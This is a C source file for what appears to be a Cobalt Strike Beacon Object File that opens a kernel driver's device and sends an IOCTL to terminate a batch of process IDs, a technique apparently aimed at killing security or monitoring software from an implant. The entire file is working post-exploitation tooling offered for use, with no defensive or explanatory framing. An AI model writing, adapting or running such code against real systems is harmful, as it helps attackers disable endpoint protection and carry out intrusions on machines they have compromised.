#include "beacon.h"
#include "ntdefs.h"
#include "utils.h"

#define DEVICE_PATH L"\\\\.\\{F8284233-48F4-4680-ADDD-F8284233}"
#define IOCTL_KILL  0x22E010
#define MAX_PIDS    16

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileW(
    LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES,
    DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$DeviceIoControl(
    HANDLE, DWORD, LPVOID, DWORD,
    LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);

// Manual itoa — no CRT in BOF
static void dword_to_str(DWORD val, char* buf) {
    char tmp[16] = {0};
    int  i = 0, j = 0;
    if (val == 0) { buf[0] = '0'; buf[1] = '\0'; return; }
    while (val > 0) {
        tmp[i++] = '0' + (val % 10);
        val /= 10;
    }
    for (j = 0; j < i; j++)
        buf[j] = tmp[i - j - 1];
    buf[i] = '\0';
}

// Manual strlen — no CRT in BOF
static DWORD slen(const char* s) {
    DWORD n = 0;
    while (s[n]) n++;
    return n;
}

// Kill a single process via IOCTL
static BOOL kill_pid(HANDLE hDevice, DWORD pid) {
    char  pidStr[16] = {0};
    char  outBuf[16] = {0};
    DWORD bytesRet   = 0;

    dword_to_str(pid, pidStr);

    return KERNEL32$DeviceIoControl(
        hDevice,
        IOCTL_KILL,
        pidStr,  slen(pidStr) + 1,
        outBuf,  sizeof(outBuf),
        &bytesRet,
        NULL);
}

void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);

    // First argument: number of PIDs to kill
    DWORD count = (DWORD)BeaconDataInt(&parser);

    if (count == 0 || count > MAX_PIDS) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Invalid PID count (max %d)\n", MAX_PIDS);
        return;
    }

    // Read all PIDs
    DWORD pids[MAX_PIDS] = {0};
    DWORD i;
    for (i = 0; i < count; i++) {
        pids[i] = (DWORD)BeaconDataInt(&parser);
        if (pids[i] == 0) {
            BeaconPrintf(CALLBACK_ERROR,
                "[-] Invalid PID at position %lu\n", i);
            return;
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Killing %lu processes in rapid succession\n", count);

    // ── Open device handle once for all kills ─────────────────
    HANDLE hDevice = KERNEL32$CreateFileW(
        DEVICE_PATH,
        GENERIC_READ | GENERIC_WRITE,
        0, NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] CreateFileW failed: %lu (driver loaded?)\n",
            KERNEL32$GetLastError());
        return;
    }

    // ── Kill all PIDs in sequence ─────────────────────────────
    DWORD killed = 0;
    for (i = 0; i < count; i++) {
        if (kill_pid(hDevice, pids[i])) {
            BeaconPrintf(CALLBACK_OUTPUT,
                "[+] PID %lu terminated\n", pids[i]);
            killed++;
        } else {
            BeaconPrintf(CALLBACK_ERROR,
                "[-] PID %lu failed: %lu\n", pids[i],
                KERNEL32$GetLastError());
        }
    }

    KERNEL32$CloseHandle(hDevice);
    BeaconPrintf(CALLBACK_OUTPUT,
        "[+] Done: %lu/%lu processes terminated\n", killed, count);
}